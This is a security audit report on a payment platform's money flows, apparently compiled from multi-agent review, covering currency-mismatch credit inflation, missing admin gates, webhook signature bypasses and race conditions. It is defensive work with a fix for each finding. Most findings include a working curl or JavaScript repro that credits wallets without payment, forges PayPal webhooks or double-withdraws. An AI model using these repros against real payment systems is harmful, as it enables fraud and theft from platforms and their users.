# Money-Flow Security Audit — Synthesis Report

**Date:** 2026-06-16
**Scope:** Payment creation, webhook handling, wallet mutations, escrow lifecycle, withdrawal flow, schema integrity, concurrency, AuthZ, observability, environment hardening — across Stripe, Razorpay, PayPal, PhonePe, bank transfer, and admin paths.
**Method:** 14-lens multi-agent review → 165 raw findings → adversarial verification (15 CRITICAL/HIGH refuted) → 150 confirmed. Re-verifies prior must-fix items M1–M12 and T1–T14 from the 2026-06-15 audit.

## 1. Executive Summary

**The platform is shipping money with multiple actively exploitable critical vulnerabilities.** The previously-shipped M11 baseAmount fix is **partially bypassed three independent ways**: (a) the user-controlled `currency` parameter inflates Stripe/PayPal/PhonePe credits by up to ~83× per call; (b) PayPal's createOrder silently drops `expectedChargeCents` so the M11 cross-check is a no-op for ALL PayPal traffic until the 2026-07-16 grace period ends; (c) the legacy `/api/transactions/webhook/:gateway` and PhonePe handler never had the M11 check. **Multiple direct money-theft and money-creation primitives exist for any authenticated user**, including: `/api/transactions/verify-paypal` (no walletId ownership check), `/api/transactions/manual-update-razorpay` (no admin gate, JWT-only auth which Strapi treats as scope-less = open-to-anyone), `/api/wallet/fix-earnings` (loops over all completed orders system-wide, non-idempotent), the PayPal sandbox-mode signature bypass (single env-var typo = wide open), and the default `/api/transactions` CRUD (mass-create transaction rows with status='success'). **Concurrency primitives are missing across the board**: spendFunds, withdrawal create, markAsPaid, PhonePe webhook, PayPal webhook, bank-transfer completion, charge.refunded, redeemPromo+spend all lack SELECT FOR UPDATE or DB transactions, producing real double-credit and over-withdraw races. **Regression detected on M11, M12, T1, T2, T4, T5, T7, T8, T13, T14**; previously-open M4, M6, M9, M10, T11, T12 remain open. Status of fixes: shipped fixes M1/M2/M3/M5/M7 hold at the original sites but are sidestepped by alternative admin paths and new entry points.

## 2. Risk Matrix

| Severity \ Exploit Class | balance_inflation | money_theft | double_credit | authz_bypass | payment_tampering | race_condition | missing_idempotency | mass_assignment | forensic_gap | data_leak | other | TOTAL |
|---|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|
| **CRITICAL** | 6 | 2 | 2 | 4 | 2 | 1 | 2 | 2 | 0 | 1 | 0 | **22** |
| **HIGH** | 3 | 3 | 7 | 6 | 6 | 8 | 6 | 1 | 5 | 1 | 2 | **48** |
| **MEDIUM** | 1 | 0 | 1 | 4 | 4 | 4 | 9 | 0 | 13 | 6 | 1 | **43** |
| **LOW** | 1 | 0 | 0 | 0 | 0 | 1 | 0 | 0 | 4 | 1 | 2 | **9** |
| **TOTAL** | **11** | **5** | **10** | **14** | **12** | **14** | **17** | **3** | **22** | **9** | **5** | **122** |

(Note: Findings deduplicated and merged across lenses where reviewers converged on the same root cause; counts reflect unique issues.)

## 3. Findings (sorted by severity)

---

## CRITICAL FINDINGS

### C1 — Currency mismatch in `computeFees`: Stripe/PayPal/PhonePe credit USD while charging native currency
- **ID:** dev-pay-1
- **Severity:** CRITICAL
- **Class:** balance_inflation
- **File:** `src/api/transaction/services/payment.js:37-104` + `src/api/transaction/controllers/transaction.js:37`
- **Risk:** Body-controlled `currency` is passed through to the gateway without an allowlist. `expectedChargeCents = Math.round(chargeUSD * 100)` is computed as if USD-cents, but the gateway charges in the supplied currency. For `{gateway:'stripe', amount:100, baseAmount:100, currency:'INR'}` the PI is created for 10000 paise (~$1.20). Stripe webhook compares `paymentIntent.amount=10000` to `expectedChargeCents=10000` → match, wallet credited $100. **~83× profit per call**, multiplied by 20 attempts/hour and $10,000/intent cap = ~$200k/hour theft surface. Razorpay branch is safe (hardcoded INR + FX). Defeats the entire M11 fix.
- **Repro:**
  ```bash
  curl -X POST $HOST/api/transactions/payment \
    -H "Authorization: Bearer $JWT" \
    -d '{"gateway":"stripe","amount":100,"baseAmount":100,"currency":"INR"}'
  # Pay $1.20 (100 INR) on the returned client_secret
  # Webhook fires → wallet credited $100
  ```
  DB check: `SELECT mainBalance FROM user_wallets WHERE id=<self>` → +$100. Stripe Dashboard → charge of 100 INR.
- **Fix:** In `computeFees`, throw if `upperCurrency !== 'USD'` for Stripe/PayPal/PhonePe (symmetric with Razorpay's hardcoded INR). Also enforce a currency allowlist at controller layer.
- **Effort:** S — **Regression risk:** low — **Reverify of M11:** partially_fixed

### C2 — PayPal `createOrder` drops `expectedChargeCents`; M11 cross-check is a no-op until 2026-07-16
- **ID:** dev-pay-2
- **Severity:** CRITICAL
- **Class:** balance_inflation
- **File:** `src/api/transaction/services/paypal.js:51-56` + `controllers/paypal-webhook.js:151-217`
- **Risk:** `customIdData` only stores `{walletId, baseAmount, totalAmount, userId}` — `expectedChargeCents` is silently dropped. PayPal webhook always finds `expectedChargeCentsFromMeta = null`, `Number.isFinite(null)` is false, and during the grace period (until 2026-07-16) the handler only logs a warning and credits the wallet. Combined with C1, PayPal is wide open.
- **Repro:** Create a PayPal order; observe `custom_id` JSON on the server's order — `expectedChargeCents` is absent. Trigger webhook → grace branch fires, credit proceeds. Logs show `[PAYPAL_LEGACY] expectedChargeCents missing — within grace period, allowing`.
- **Fix:** Add `expectedChargeCents: metadata.expectedChargeCents ?? null` to `customIdData`. Add an integration test that round-trips through createOrder + getOrderDetails to assert the field is preserved.
- **Effort:** S — **Regression risk:** low — **Reverify of M11:** **REGRESSED**

### C3 — `verifyPayPalPayment` credits attacker-chosen walletId from any completed PayPal orderId
- **ID:** dev-pay-3, qa-pay-4, authz-2, sec3-7
- **Severity:** CRITICAL
- **Class:** money_theft / authz_bypass
- **File:** `src/api/transaction/controllers/transaction.js:886-987`
- **Risk:** Route accepts `{orderId, walletId}` from body, gated by `api::transaction.transaction.create` scope only. Wallet looked up by `id` alone — no ownership check against `ctx.state.user.id`. Dedup key is `(gatewayTransactionId, user_wallet)` so re-binding to a different walletId bypasses dedup. Attacker who learns/observes any COMPLETED PayPal orderId (visible in returnUrl, browser history, support tickets, referrer headers) posts it with their own walletId and is credited the victim's payment amount. The transaction's `users_permissions_user` is set from the wallet (line 963), masking the attacker.
- **Repro:**
  ```bash
  # Attacker authenticated, learns victim_orderId
  curl -X POST $HOST/api/transactions/verify-paypal \
    -H "Authorization: Bearer $ATTACKER_JWT" \
    -d '{"orderId":"<victim_completed_order>","walletId":<attacker_wallet>}'
  ```
  DB check: `SELECT mainBalance FROM user_wallets WHERE id=<attacker_wallet>` → +victim_amount.
- **Fix:** Resolve walletId from `ctx.state.user` (look up by `users_permissions_user=ctx.state.user.id`). Dedupe by `gatewayTransactionId` alone. Validate `purchase_units[0].custom_id.walletId === resolved_walletId`. Add M11 amount-mismatch check from pending tx metadata.
- **Effort:** S — **Regression risk:** low — **Reverify of T13:** new_evidence (critical)

### C4 — `/api/transactions/manual-update-razorpay` admin gate missing; any JWT user can mark tx success and credit any wallet
- **ID:** dev2-4, sec2-pay-4, authz-1
- **Severity:** CRITICAL
- **Class:** authz_bypass / money_theft
- **File:** `src/api/transaction/routes/transaction.js:252-261` + `controllers/razorpay-webhook.js:928-977`
- **Risk:** Route declared `auth: { strategies: ['jwt'] }` with **no scope, no policies**. Strapi's users-permissions strategy (verified at node_modules/@strapi/plugin-users-permissions/server/strategies/users-permissions.js:80-91) explicitly comments "An authenticated user can access non-scoped routes" — so the DB revocation in the 2026-05-23 security migration is bypassed. Handler does zero admin / ownership / idempotency checks. Self-credit path: attacker creates pending Razorpay tx for $9999 via `/api/transactions/pending` (T6 still grants `create` to authenticated), then POSTs to manual-update-razorpay with `{order_id, status:'success'}` — wallet credited $9999 with no payment. Repeating compounds. **Note**: one verifier on this finding incorrectly concluded the route returns 401 — they confused the in-route `strategies` resolution with the registered strategy name `users-permissions`. The actual route IS reachable (multiple other auth:jwt routes in the same file work in production). Treat as critical.
- **Repro:**
  ```bash
  # Step 1: create pending tx (attacker JWT)
  curl -X POST $HOST/api/transactions/pending -H "Authorization: Bearer $JWT" \
    -d '{"amount":9999,"currency":"INR","gateway":"razorpay","gatewayTransactionId":"order_pwn","walletId":<self>}'
  # Step 2: manual-update
  curl -X POST $HOST/api/transactions/manual-update-razorpay -H "Authorization: Bearer $JWT" \
    -d '{"order_id":"order_pwn","payment_id":"pay_fake","status":"success"}'
  ```
- **Fix:** Add `policies: ['global::is-admin'], middlewares: ['global::admin-jwt-auth']` to the route (mirror cleanup-pending-razorpay at lines 263-271). Add in-controller admin check as defense-in-depth. Add expectedChargeCents validation.
- **Effort:** S — **Regression risk:** low

### C5 — `/api/wallet/fix-earnings` system-wide non-idempotent loop; any authenticated user inflates every publisher's wallet
- **ID:** qa-pay-3
- **Severity:** CRITICAL (rated HIGH originally; uplifted due to blast radius)
- **Class:** balance_inflation
- **File:** `src/api/user-wallet/routes/user-wallet.js:157-165` + `controllers/user-wallet.js:726-831`
- **Risk:** Route declared `auth: {}` with empty policies. The handler `fixCompletedOrderEarnings` queries **ALL** orders system-wide (no `ctx.state.user.id` filter) where orderStatus IN ('approved','completed'). For each order with existing escrow_release tx, line 770-775 unconditionally does `publisherWallet.balance + totalEarnings` — re-adding the cumulative historical earnings on **every invocation**. N calls = N× inflation across the entire publisher base. The code's own comment calls it "idempotent" — it is the opposite.
- **Repro:**
  ```bash
  curl -X POST $HOST/api/wallet/fix-earnings -H "Authorization: Bearer $ANY_USER_JWT"
  # Returns 200. Every publisher's wallet.balance inflated by sum of their escrow_release tx amounts.
  # Re-run to multiply.
  ```
  DB check: `SELECT id, balance FROM user_wallets` before vs after.
- **Fix:** Add `policies: ['global::is-admin']`. Better: delete the endpoint entirely (one-shot migration tool, no longer needed). If kept, scope to caller and add per-order sentinel transaction so re-runs are no-ops.
- **Effort:** S — **Regression risk:** low — **Reverify of T5:** new_evidence (worse than original)

### C6 — PayPal webhook signature verification bypassed when `PAYPAL_ENVIRONMENT !== 'live'`
- **ID:** dev2-2, dev-env-2, sec3-2
- **Severity:** CRITICAL
- **Class:** payment_tampering
- **File:** `src/api/transaction/services/paypal.js:199-209`
- **Risk:** `if (process.env.PAYPAL_ENVIRONMENT !== 'live') return {verified:true, verificationStatus:'SANDBOX_BYPASS'}` — **no** cryptographic check, **no** NODE_ENV gate, **no** opt-in flag. Asymmetric with the PayPal client (line 16) which requires BOTH `NODE_ENV=production` AND `PAYPAL_ENVIRONMENT=live` for live mode. Any env-var typo (`Live`, `LIVE`, `production`, unset) silently disables signature checks while server runs sandbox creds. Exploit chain: attacker creates a real sandbox PayPal order via the legitimate `createPayment` endpoint with attacker-controlled `baseAmount=999999` in body (no validation against `amount`), captures $0.01 sandbox order, then forges a `PAYMENT.CAPTURE.COMPLETED` webhook → bypass passes → wallet credited $999,999 from sandbox $0.01.
- **Repro:**
  ```bash
  # Misconfig prerequisite: PAYPAL_ENVIRONMENT unset or non-'live'
  curl -X POST $HOST/api/transactions/paypal-webhook \
    -H "paypal-transmission-id: x" -H "paypal-transmission-time: 2026-06-16T00:00:00Z" \
    -H "paypal-cert-url: https://x" -H "paypal-auth-algo: x" -H "paypal-transmission-sig: x" \
    -d '{"event_type":"PAYMENT.CAPTURE.COMPLETED","resource":{"id":"FAKE_CAP","amount":{"value":"0.01","currency_code":"USD"},"supplementary_data":{"related_ids":{"order_id":"<attacker_sandbox_order>"}}}}'
  ```
- **Fix:** Remove sandbox bypass entirely; always run certificate verification. Refuse to boot if PayPal SDK is used and `PAYPAL_ENVIRONMENT !== 'live'` in production. Fail-closed at module load.
- **Effort:** M — **Regression risk:** medium

### C7 — Bank-transfer `update` writes invalid transaction (silently dropped), then double-credits wallet on retry
- **ID:** dev4-3, qa2-5, qa-pay-7, sec2-pay-7, qa4-schema-4
- **Severity:** CRITICAL
- **Class:** missing_idempotency / enum_mismatch / mass_assignment
- **File:** `src/api/bank-transfer-request/controllers/bank-transfer-request.js:171-235`
- **Risk:** Three compounding defects: **(a)** No idempotency — `if (status === 'completed')` checks the request *body* status, not the DB row's prior state, so a PUT with status='completed' on an already-completed request re-credits the wallet. **(b)** Schema mismatch — creates transaction with `type:'bank_transfer'` (not in enum), `status:'completed'` (field doesn't exist, schema field is `transactionStatus`), missing required `gateway, gatewayTransactionId, netAmount, transactionStatus`. Strapi validation throws AFTER the wallet update committed, then the try/catch on line 231-234 swallows the error. **(c)** No DB transaction wrapping. Result: wallet credited, NO audit row, balance/ledger drift. Admin double-click ⇒ deterministic double-credit. Also `create` (line 14) trusts body `userId` — any authenticated user files a bank-transfer request as someone else, admin completion credits the planted user.
- **Repro:**
  ```bash
  # Step 1 (attacker, victim_userId planted at create)
  curl -X POST $HOST/api/bank-transfer-requests -H "Authorization: Bearer $JWT" \
    -d '{"amount":500,"referenceNumber":"R1","transactionId":"T1","userId":<victim>,"userEmail":"...","userName":"Victim"}'
  # Step 2 (admin marks completed, twice)
  curl -X PUT $HOST/api/bank-transfer-requests/$id -H "Authorization: Bearer $ADMIN_JWT" \
    -d '{"status":"completed"}'
  curl -X PUT $HOST/api/bank-transfer-requests/$id -H "Authorization: Bearer $ADMIN_JWT" \
    -d '{"status":"completed"}'
  ```
  DB check: `SELECT mainBalance FROM user_wallets WHERE users_permissions_user=<victim>` → +$1000 (double credit). `SELECT * FROM transactions WHERE gatewayTransactionId LIKE 'bank_%'` → empty (schema-validation throws).
- **Fix:** (i) Pre-state guard: refuse if `request.status === 'completed'`. (ii) Wrap wallet update + tx create in `strapi.db.transaction` with `forUpdate` on bank_transfer_requests row. (iii) Fix tx payload: `type:'deposit', transactionStatus:'success', gateway:'bank_transfer', gatewayTransactionId:`bank_${id}_${ref}`, netAmount=amount`. (iv) Derive userId from `ctx.state.user` in create, drop body fields. (v) Use the `global::is-admin` policy on PUT (currently `scope:['admin']` only).
- **Effort:** M — **Regression risk:** low — **Reverify of T1:** **REGRESSED**

### C8 — Withdrawal lifecycle has zero idempotency; any Strapi-admin field edit on a denied/paid withdrawal re-fires money flow
- **ID:** dev-cron-1
- **Severity:** CRITICAL
- **Class:** double_credit
- **File:** `src/api/withdrawal-request/content-types/withdrawal-request/lifecycles.js:322-338, 4-126, 128-267`
- **Risk:** `afterUpdate` dispatches purely on `result.withdrawal_status` with no `previousData` comparison, no `refundedAt`/`paidAt` flag check, no advisory lock. `handleDeniedWithdrawal` (lines 162-173) unconditionally does `newMainBalance = currentMainBalance + totalRefund` (withdrawal amount + 20% platform fee) and creates a new refund transaction with `Date.now()`-salted gatewayTransactionId (no DB dedup). Strapi Content-Manager editing `admin_notes`/`payment_notes`/`denial_reason` on an already-denied row re-fires the lifecycle → wallet credited again with full refund+fee. Schema's `privateAttributes` list literally enumerates admin-editable post-denial fields, evidencing this exact admin workflow exists.
- **Repro:**
  ```sql
  -- 1. Publisher requests $100 withdrawal; mainBalance -= $125 (incl 20% fee), pending += $100
  -- 2. Admin denies via /admin/withdrawal-requests/:id/reject: mainBalance += $125, pending -= $100 (net unchanged, correct)
  -- 3. Admin opens row in Strapi admin panel, edits admin_notes, saves
  -- → afterUpdate fires again with status='denied' → mainBalance += $125 AGAIN
  ```
- **Fix:** Add `refundedAt` + `paidAt` columns. In beforeUpdate, stash `previousData.withdrawal_status`. In afterUpdate, only dispatch when status actually changed AND the corresponding timestamp is null. Set timestamp inside the lifecycle. Wrap in db.transaction with FOR UPDATE.
- **Effort:** M — **Regression risk:** medium

### C9 — Generic `/api/transactions/webhook/:gateway` route bypasses M11 + has no PayPal signature check
- **ID:** dev-pay-6, dev2-16, qa2-14, sec2-pay-1, sec3-4
- **Severity:** CRITICAL (uplifted from HIGH; multiple lenses converge)
- **Class:** authz_bypass / payment_tampering
- **File:** `src/api/transaction/routes/transaction.js:129-144` + `controllers/transaction.js:398-748`
- **Risk:** Routes `/api/transactions/webhook/:gateway` AND the typo-duplicate `/api/api/transactions/webhook/:gateway` both `auth:false`. PayPal branch (lines 388-440) calls `capturePayPalPayment(orderID)` with NO signature verification whatsoever — any caller POSTs `{resource:{id:<known_pending_paypal_order>}}` and the order is captured and wallet credited. Razorpay branch uses checkout-HMAC (`RAZORPAY_KEY_SECRET`) instead of webhook secret. Wallet credit path (lines 446-684) reads `existingTransaction.amount` (DB-stored) with NO `expectedChargeCents` cross-check — the M11 fix only exists in the dedicated webhook handlers.
- **Repro:**
  ```bash
  # Attacker creates pending tx with inflated amount
  curl -X POST $HOST/api/transactions/pending -H "Authorization: Bearer $JWT" \
    -d '{"amount":10000,"gateway":"paypal","gatewayTransactionId":"<real_approved_order>","walletId":<self>}'
  # Hit generic webhook (no auth, no sig check)
  curl -X POST $HOST/api/transactions/webhook/paypal \
    -d '{"resource":{"id":"<real_approved_order>"}}'
  # → server captures the order, credits $10000 from a $0.01 actual capture
  ```
- **Fix:** Delete both routes (lines 129-144) AND the `handleWebhook` generic handler. Per-gateway dedicated routes are the canonical hardened paths.
- **Effort:** S — **Regression risk:** medium — **Reverify of T14:** **REGRESSED**

### C10 — Hardcoded ExchangeRate-API key committed to repo
- **ID:** dev-env-1
- **Severity:** CRITICAL
- **Class:** data_leak
- **File:** `src/api/payment-gateways/services/exchange-rate.js:14-15`
- **Risk:** `process.env.EXCHANGE_RATE_API_KEY || '[REDACTED-rotated-2026-06-17]'` — real production API key checked into source. Anyone with repo read access (contractors, leaks, ex-employees, mirror snapshots) gets free use. Worse: if env override is forgotten, the fallback silently keeps working — breach is undetectable. Indirect money impact: FX conversions silently use a key the org cannot rotate atomically (reading source reveals it).
- **Repro:** `git log -p -- src/api/payment-gateways/services/exchange-rate.js | grep '[REDACTED-rotated-2026-06-17]'` returns the secret.
- **Fix:** Delete the fallback string. `throw new Error('EXCHANGE_RATE_API_KEY required')` at module load if unset. Rotate the leaked key at ExchangeRate-API immediately and treat as compromised.
- **Effort:** S — **Regression risk:** low

### C11 — `spendFunds` reads-then-writes wallet with no row lock — concurrent order creates over-spend escrow
- **ID:** race-1, qa-pay-12
- **Severity:** CRITICAL
- **Class:** balance_inflation / race_condition
- **File:** `src/api/user-wallet/controllers/user-wallet.js:924-1003` + `src/api/order/services/order.js:108`
- **Risk:** `spendFunds` accepts no `trx` parameter. `getOrCreateWallet(userId)` at line 926 uses plain `findOne` with no `forUpdate`. Lines 952-956 compute newMainBalance from the stale read and write via `entityService.update` with no `transacting`. Order.create wraps in db.transaction but cannot propagate trx into spendFunds — the wallet write auto-commits on a separate connection. Two concurrent POSTs `/api/orders` from the same advertiser with mainBalance=$100 each for $80: both read $100, both pass affordability check, both write $20 (lost update), both add $80 to escrow → wallet $20 main + $160 escrow against $100 deposited = $80 of phantom value. The dedup guard at controllers/order.js:301 only matches identical `(website, description)` within 1s; different websites trivially bypass.
- **Repro:**
  ```javascript
  // advertiser balance = $100
  await Promise.all([
    fetch('/api/orders', { method:'POST', body: JSON.stringify({websiteId:1, totalAmount:80, ...}) }),
    fetch('/api/orders', { method:'POST', body: JSON.stringify({websiteId:2, totalAmount:80, ...}) }),
  ]);
  ```
  DB check: `SELECT mainBalance, escrowBalance FROM user_wallets WHERE users_permissions_user=<advertiser>` → main=$20, escrow=$160.
- **Fix:** Refactor `spendFunds(userId, amount, orderId, txData, trx)` to accept transaction handle. Use `knex('user_wallets').where({id}).forUpdate().transacting(trx)` for the read. Propagate trx from order.create.
- **Effort:** M — **Regression risk:** medium

### C12 — PhonePe webhook + `/phonepe-status` race produces double wallet credit on concurrent retries
- **ID:** race-2, qa-pay-6, sec2-pay-5, sec3-5, qa2-8
- **Severity:** CRITICAL
- **Class:** double_credit
- **File:** `src/api/transaction/controllers/phonepe-webhook.js:13-160`
- **Risk:** Both `handleCallback` (line 13) and `checkStatus` (line 92) findOne by gatewayTransactionId with no lock, check `transactionStatus !== 'success'`, then update + call `updateWalletBalance` (lines 167-197 — non-atomic read-modify-write). `/api/transactions/phonepe-status` is `auth:false`. Compared to Razorpay (which uses `strapi.db.transaction` + `knex.forUpdate()`), PhonePe has nothing. Concurrent retry from PhonePe + concurrent client poll both pass the idempotency check and both credit. No `expectedChargeCents` check — credits `statusResult.amount` (PhonePe-reported, not transaction.amount). T9 + T12 still open.
- **Repro:** After completing a PhonePe payment, fire 5 parallel POSTs to `/api/transactions/phonepe-status {transactionId: TXN_...}` (or rely on PhonePe's natural retries). All pass status guard, wallet credited 5×.
- **Fix:** Wrap handleCallback + checkStatus in `strapi.db.transaction({trx})` with `knex('transactions').where(...).forUpdate().transacting(trx)`. Add M11 expectedChargeCents check against transaction.metadata. Move /phonepe-status behind JWT + owner check (or remove its wallet-credit side effect).
- **Effort:** M — **Regression risk:** low — **Reverify of T9, T12:** **REGRESSED**

### C13 — Withdrawal markAsPaid: no row lock; concurrent admin clicks decrement pendingWithdrawalBalance 2-3×, create duplicate payouts
- **ID:** race-4, dev-cron-3, qa2-3, qa-pay-5
- **Severity:** CRITICAL
- **Class:** double_withdrawal / race_condition
- **File:** `src/api/withdrawal-request/controllers/withdrawal-request.js:791-979`, `src/api/admin/controllers/withdrawals.js:448-524`
- **Risk:** Both admin endpoints exist (`/admin/withdrawal-requests/:id/mark-as-paid` and `/admin/withdrawals/:id/mark-as-paid`) without SELECT FOR UPDATE on `withdrawal_requests` row or `user_wallets` row. Read at line 811, status check at 820, update at 885, decrement at 921 — all separate queries. Lifecycle `handlePaidWithdrawal` *also* decrements pendingWithdrawalBalance (lifecycles.js:33-42) and fires for every entityService.update with status='paid'. Two concurrent admin clicks both pass status='approved' check, both proceed → for PayPal method, two real `createPayPalPayout` calls fire (double external money out), two payout transactions written. Fuzzy lookup `description: { $contains: 'Withdrawal request' }` (line 901-902) can hit the wrong tx when publisher has multiple pending withdrawals.
- **Repro:**
  ```bash
  # Two parallel admin clicks
  curl -X POST $HOST/api/admin/withdrawal-requests/$id/mark-as-paid -H "Authorization: Bearer $ADMIN" &
  curl -X POST $HOST/api/admin/withdrawal-requests/$id/mark-as-paid -H "Authorization: Bearer $ADMIN" &
  wait
  ```
  DB check: 2 payout rows in `transactions` for same withdrawal, pending balance decremented twice.
- **Fix:** Wrap in `strapi.db.transaction` with `forUpdate` on withdrawal_requests by id BEFORE the status check. Re-check status under lock. Replace `description.$contains` with FK lookup via a `withdrawal_request` relation on transaction. Remove one of the two duplicate admin endpoints.
- **Effort:** M — **Regression risk:** low — **Reverify of T2:** **REGRESSED**

### C14 — PayPal handlePaymentRefunded breaks balance invariant; refund creates double-spend window
- **ID:** dev2-8, qa2-9
- **Severity:** CRITICAL (uplifted from HIGH; concrete money-loss path)
- **Class:** money_theft
- **File:** `src/api/transaction/controllers/paypal-webhook.js:412-425`
- **Risk:** Handler decrements only `wallet.balance` via `max(0, balance - refundAmount)`; does NOT touch `mainBalance` or `promoBalance`. But `spendFunds` (user-wallet.js:924-962) reads mainBalance/promoBalance directly to authorize spending — balance is unused for spend decisions. Scenario: user deposits $100 PayPal → mainBalance=100, balance=100. Spends $50 → mainBalance=50, balance=50. PayPal refund $100 fires → balance=0, mainBalance UNCHANGED at $50. User spends another $50 — `spendFunds` reads mainBalance=50, allows it. User received $100 refund + $100 of services for original $100 paid = $100 free.
- **Repro:** As above — verifiable via wallet table after sequential operations.
- **Fix:** Decrement `mainBalance` (or `promoBalance` for promo refunds), then recompute `balance = mainBalance + promoBalance`. If refundAmount > mainBalance, flag for manual reconciliation. Wrap in db.transaction with forUpdate on wallet.
- **Effort:** M — **Regression risk:** high (wallet invariant changes)

---

## HIGH FINDINGS (full detail)

### H1 — PhonePe webhook credits gateway-reported amount, ignores DB transaction.amount and expectedChargeCents
- **ID:** dev-pay-4, qa2-8 (component)
- **Class:** balance_inflation / missing M11 coverage
- **File:** `src/api/transaction/controllers/phonepe-webhook.js:33-78, 110-149, 167-197`
- **Risk:** `updateWalletBalance(wallet.id, amount, ...)` uses `callbackResult.amount` / `statusResult.amount` (PhonePe-reported) rather than `transaction.amount`. No expectedChargeCents check. Combined with currency mismatch (C1) and createPendingTransaction unallowed-list (H4), allows arbitrary credit. Even on legitimate payment, partial refund replay corrupts balance.
- **Repro:** Forge or replay a PhonePe callback (after stealing salt key) with inflated amount — wallet credited that amount.
- **Fix:** Credit `transaction.amount` not callback amount. Add M11 check. Wrap in db.transaction with forUpdate.
- **Effort:** M — **Regression risk:** medium

### H2 — Razorpay webhook HMACs JSON.stringify(parsed body) instead of raw body
- **ID:** dev-pay-7, dev2-3, dev-cron-6, qa-pay-8, sec3-1 (referenced), qa2-... 
- **Class:** payment_tampering
- **File:** `src/api/transaction/controllers/razorpay-webhook.js:46-57`
- **Risk:** Computes HMAC over `JSON.stringify(ctx.request.body)` (parsed object). Razorpay signs raw bytes. Re-serialization differs (key order, whitespace, Unicode escapes), causing (a) legitimate webhooks to fail on edge cases AND (b) widening forgery surface where canonical-form inputs match a captured signature. Stripe handler uses Symbol.for('unparsedBody') correctly — proves the team knows the pattern. Comparison also uses non-constant-time `!==`.
- **Repro:** Static: line 48. Compare with stripe-webhook.js:17-19.
- **Fix:** Read `ctx.request.body[Symbol.for('unparsedBody')] || ctx.request.body._unparsedBody` and HMAC that string. Use `crypto.timingSafeEqual(Buffer.from(a,'hex'), Buffer.from(b,'hex'))`.
- **Effort:** S — **Regression risk:** low — **Reverify of M12:** **REGRESSED**

### H3 — PayPal webhook signature uses SHA-256 over re-serialized JSON; PayPal spec requires CRC32 over raw body
- **ID:** dev2-3, sec3 (related to PayPal)
- **Class:** payment_tampering
- **File:** `src/api/transaction/services/paypal.js:237-250`
- **Risk:** Line 237: `webhookEvent = typeof body === 'string' ? body : JSON.stringify(body)`. Line 238: `crypto.createHash('sha256').update(webhookEvent).digest('hex')` then used as `crc32` in the expected sig string. Per PayPal spec, signed string is `transmissionId|transmissionTime|webhookId|CRC32(body)`. SHA-256 (64-char hex) ≠ CRC32 (8-char hex). Live PayPal verification cannot succeed for any valid webhook. Operators encountering failures may revert to sandbox bypass (C6), at which point money credits become fully forgeable.
- **Fix:** Use raw body (Symbol.for('unparsedBody')). Use `zlib.crc32` or `crc-32` package. Pin trusted CA chain.
- **Effort:** M — **Regression risk:** medium

### H4 — createPendingTransaction has no allowlist; caller plants arbitrary amount/gateway/wallet
- **ID:** dev-cron-9, sec2-pay-2
- **Class:** mass_assignment
- **File:** `src/api/transaction/controllers/transaction.js:774-825`
- **Risk:** POST /api/transactions/pending accepts amount, currency, gateway, gatewayTransactionId, walletId directly. No server-side computeFees. No expectedChargeCents in metadata. Stores attacker's chosen `amount`. When the matching webhook arrives during grace period (or via H1/C12 PhonePe path or generic webhook C9), `transaction.amount` is credited. Combined with C4 manual-update, attacker plants + escalates self-credit at will.
- **Fix:** Call computeFees server-side, derive amount, store expectedChargeCents/walletCreditUSD in metadata. Refuse if client amount differs by >0.01. Or kill the endpoint — Stripe/Razorpay flows already create pending rows in createPayment.
- **Effort:** M — **Regression risk:** low — **Reverify of T10:** **REGRESSED**

### H5 — Default `/api/transactions` CRUD inherits core controller; cross-tenant data + mass-create
- **ID:** dev-pay-9, sec2-pay-11, authz-9
- **Class:** authz_bypass / mass_assignment / data_leak
- **File:** `src/api/transaction/routes/transaction.js:10-60` + controller has no overrides
- **Risk:** Default GET/POST/PUT/DELETE routes registered. `api::transaction.transaction.create` is granted to authenticated (required by `/createPayment` and revoked update/delete only). POST `/api/transactions` mass-creates a transaction with `{type:'deposit', amount:99999, gateway:'stripe', transactionStatus:'success', fund_source:'main_fund', users_permissions_user, user_wallet}`. Live test on production confirmed: HTTP 201, transaction id created with attacker amount; wallet balance untouched, but the row participates in admin audits, transaction-history listings, and gets aggregated by reports. GET find/findOne may also leak data depending on `find` grant — one verifier showed live 403, another live 201/200, indicating environment drift.
- **Repro:** Live-confirmed:
  ```bash
  curl -X POST $HOST/api/api/transactions -H "Authorization: Bearer $JWT" \
    -d '{"data":{"amount":99999,"transactionStatus":"success","type":"deposit","gateway":"stripe","gatewayTransactionId":"fake"}}'
  # → 201 with new tx id
  ```
- **Fix:** Override `create/update/delete` in controller to throw 403. Override `find/findOne` to enforce `filters.users_permissions_user = ctx.state.user.id`. Better: register routes with `except:['create','update','delete','find']` and move all needs to dedicated routes.
- **Effort:** M — **Regression risk:** medium — **Reverify of T6:** **REGRESSED** (partial)

### H6 — Default PUT `/api/withdrawal-requests/:id` lets user mass-assign withdrawal_status, triggering refund lifecycle
- **ID:** sec2-pay-6
- **Class:** mass_assignment / authz_bypass
- **File:** `src/api/withdrawal-request/routes/withdrawal-request.js:1-15`
- **Risk:** `createCoreRouter(..., { except: ['create'] })` — only create is disabled; update remains. Lifecycle afterUpdate fires `handleDeniedWithdrawal/handlePaidWithdrawal` on any status flip. Migration revoked approveWithdrawal+delete but NOT update. PUT `/withdrawal-requests/<own_id>` with `{data:{withdrawal_status:'denied'}}` on a pending request invokes refund (mainBalance += amount + 20% fee, pending -= amount) without any actual denial. Repeating with 'paid' then 'denied' compounds (see C8).
- **Fix:** `createCoreRouter(..., { except: ['create','update','delete'] })`. Revoke `api::withdrawal-request.withdrawal-request.update` from authenticated. Add beforeUpdate lifecycle guard rejecting client-initiated status transitions.
- **Effort:** M — **Regression risk:** low

### H7 — Withdrawal create: balance check + wallet deduction not atomic, no row lock
- **ID:** dev4-2, race-5, qa2-4, sec2-pay-9, dev-cron-... , authz-12, dev-obs-8
- **Class:** race_condition / double_withdrawal
- **File:** `src/api/withdrawal-request/controllers/withdrawal-request.js:242-446`
- **Risk:** Read publisherWallet (line 242) → balance check (337) → withdrawal-request create (349) → transaction create (406) → wallet update (437). No `strapi.db.transaction`, no `forUpdate`. 10-second dedup at line 217 is TOCTOU and only matches identical `(amount, method)`. Two parallel POSTs with mainBalance=$100 amount=$48 (totalDeduction=$60): both read $100, both pass check, both create withdrawal_request rows + transaction rows, last-write-wins on wallet update (mainBalance=$40), but TWO pending withdrawals of $48 each = $96 payout owed against $100 deposit. OTP also non-atomically cleared (line 193 outside trx), letting concurrent requests reuse the same OTP.
